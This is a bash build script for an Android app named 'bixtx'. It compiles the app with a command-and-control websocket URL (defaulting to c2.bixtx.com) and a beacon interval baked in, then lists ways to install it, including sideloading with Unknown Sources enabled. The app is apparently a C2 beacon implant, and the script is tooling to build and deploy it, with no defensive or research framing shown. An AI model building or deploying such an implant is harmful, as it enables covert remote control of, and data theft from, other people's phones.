#!/usr/bin/env bash
# Build the bixtx Android APK locally.
# Usage: ./build.sh [c2WsUrl] [beaconInterval]
# Example: ./build.sh "wss://c2.bixtx.com:3001" 30
set -e

C2_URL="${1:-wss://c2.bixtx.com:3001}"
BEACON="${2:-30}"

echo "==> Building bixtx Android APK"
echo "    C2 URL:  $C2_URL"
echo "    Beacon:  ${BEACON}s"
echo ""

# Ensure gradlew is executable
chmod +x gradlew

./gradlew assembleRelease \
  -Pc2WsUrl="$C2_URL" \
  -PbeaconInterval="$BEACON" \
  --no-daemon

APK="app/build/outputs/apk/release/app-release.apk"
if [ -f "$APK" ]; then
  SIZE=$(du -h "$APK" | cut -f1)
  echo ""
  echo "✓ Build complete: $APK ($SIZE)"
  echo ""
  echo "Install options:"
  echo "  adb install -r $APK"
  echo "  OR: copy to device and open (enable Unknown Sources first)"
else
  echo "✗ APK not found at expected path. Check build output above."
  exit 1
fi
